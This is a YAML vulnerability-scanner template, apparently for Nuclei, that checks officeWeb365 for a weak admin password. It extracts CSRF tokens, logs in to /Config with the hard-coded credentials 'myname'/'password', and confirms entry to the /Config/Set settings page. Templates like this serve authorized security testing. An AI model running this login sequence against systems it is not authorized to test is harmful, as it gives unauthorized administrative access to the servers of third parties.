id: poc-yaml-officeweb365-weak-password

info:
  name: officeWeb365 Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password,officeweb365

flow: |
  http(1) && http(2) && http(3)

variables:
  token_1: ""
  token_2: ""
  cookie: ""

http:
  - id: "step-1"
    method: GET
    path:
      - "{{BaseURL}}/Config"
    matchers:
      - type: word
        part: body
        words:
          - "__RequestVerificationToken"
    extractors:
      - type: regex
        name: token_1
        part: header
        internal: true
        regex:
          - "__RequestVerificationToken=(.*?);"
      - type: regex
        name: token_2
        part: body
        internal: true
        regex:
          - "__RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\""

  - id: "step-2"
    method: POST
    path:
      - "{{BaseURL}}/Config"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "__RequestVerificationToken={{token_1}}"
    body: "uName=myname&uPass=password&__RequestVerificationToken={{token_2}}"
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - "/Config/Set"
    extractors:
      - type: regex
        name: cookie
        part: header
        internal: true
        regex:
          - "OfficeWeb3653=(.*?);"

  - id: "step-3"
    method: GET
    path:
      - "{{BaseURL}}/Config/Set"
    headers:
      Cookie: "OfficeWeb3653={{cookie}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "配置-OfficeWeb365"
          - "全局设置"
